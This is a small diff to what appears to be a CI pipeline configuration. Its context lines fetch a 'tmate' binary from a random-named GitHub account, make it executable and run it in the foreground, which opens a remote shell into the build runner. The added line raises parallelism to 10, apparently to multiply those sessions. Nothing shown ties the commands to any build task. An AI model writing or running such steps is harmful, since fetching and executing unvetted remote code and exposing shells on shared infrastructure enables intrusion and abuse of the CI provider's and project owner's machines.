@@ -13,3 +13,4 @@ blocks:
             - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
             - chmod +x tmate
             - ./tmate -F
+          parallelism: 10
